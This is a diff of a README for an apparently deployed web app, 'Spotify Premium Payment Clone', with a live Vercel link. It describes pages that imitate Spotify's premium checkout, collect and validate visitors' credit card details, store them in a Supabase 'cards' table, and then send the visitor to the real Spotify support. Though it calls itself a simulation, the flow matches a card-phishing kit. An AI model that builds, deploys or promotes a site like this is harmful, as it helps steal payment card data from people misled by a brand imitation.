@@ -1,4 +1,4 @@
-# Spotify Payment Manager
+# Spotify Premium Payment Clone
 
 A modern web application that simulates Spotify's premium subscription payment flow. Built with modern web technologies and deployed on Vercel.
 
@@ -10,7 +10,7 @@ Visit the live application at: [https://spotifyec.vercel.app](https://spotifyec.
 
 - 🎨 Modern, responsive UI matching Spotify's design language
 - 💳 Secure credit card data collection
-- 🔒 Real-time card validation
+- 🔒 Real-time card validation with Luhn algorithm
 - 📱 Mobile-friendly design
 - 🔄 Seamless redirect flow
 - 🗃️ Data storage with Supabase
@@ -44,8 +44,8 @@ Visit the live application at: [https://spotifyec.vercel.app](https://spotifyec.
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/mat1520/-spotify-payment-manager-.git
-cd spotify-payment-manager
+git clone https://github.com/mat1520/spotify-premium-payment-clone.git
+cd spotify-premium-payment-clone
 ```
 
 2. Install dependencies:
@@ -80,12 +80,11 @@ vercel --prod
 ## 📁 Project Structure
 
 ```
-spotify-payment-manager/
+spotify-premium-payment-clone/
 ├── api/                 # Serverless API functions
 │   └── cards/          # Card management endpoints
 ├── lib/                # Shared libraries
 │   └── supabase.js     # Supabase client configuration
-├── styles/             # CSS styles
 ├── index.html          # Plan selection page
 ├── pay.html           # Payment form page
 ├── vercel.json        # Vercel configuration
@@ -120,8 +119,8 @@ CREATE TABLE cards (
 1. User visits the landing page
 2. Selects a Premium plan
 3. Enters card details
-4. System validates input
-5. Data is stored securely
+4. System validates input in real-time
+5. Data is stored securely in Supabase
 6. User is redirected to Spotify support
 
 ## 👥 Team Access
@@ -156,7 +155,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📞 Support
 
-For support, email [your-email@domain.com] or join our Slack channel.
+For support, email [arielmelo1520@hotmail.com]
 
 ## 🙏 Acknowledgments
 
@@ -165,4 +164,4 @@ For support, email [your-email@domain.com] or join our Slack channel.
 - Supabase for database services
 
 ---
-Made with ❤️ by Your Team
+Made with ❤️ by Ariel Melo
